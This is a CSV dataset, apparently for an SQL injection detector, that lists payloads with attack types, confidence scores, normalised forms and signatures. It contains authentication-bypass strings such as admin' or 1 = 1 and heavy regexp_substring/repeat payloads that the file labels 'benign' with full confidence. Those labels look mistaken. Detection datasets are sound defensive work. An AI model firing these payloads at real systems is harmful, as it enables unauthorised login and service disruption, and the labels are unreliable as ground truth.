id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
294,admin' or 1 = 1,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 15 chars.,2,admin' or 1 = 1,False,0,__IDENT__' or __INT__ = __INT__,03e8a0e6,silver
148,admin' or 1 = 1/*,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 17 chars.,2,admin' or 1 = 1/*,False,0,__IDENT__' or __INT__ = __INT__ / *,067e7bbd,silver
99,admin' or '1' = '1'#,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 20 chars.,2,admin' or '1' = '1'#,False,0,__IDENT__'#,11022207,silver
132,admin' #,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 8 chars.,2,admin' #,False,0,__IDENT__' #,984e7d23,silver
11,admin' or 1 = 1#,auth_bypass,generic,0.7,Authentication bypass pattern. Payload length: 16 chars.,2,admin' or 1 = 1#,False,0,__IDENT__' or __INT__ = __INT__#,caac8fa4,silver
19717,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 80 chars.",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",243ed052,silver
1533,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 131 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) ) || '",c82e3477,silver
19136,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 86 chars.",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) ||'",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) ) || '",1fbb0155,silver
2237,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 132 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) # __IDENT__",3b476f1d,silver
25628,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 128 chars.",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",6c1200bb,silver
22793,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) -- vhmc",benign,generic,1.0,"Signals: 'substring', 'substr', 'char'. Payload length: 88 chars.",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) -- vhmc",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",39a286b8,silver
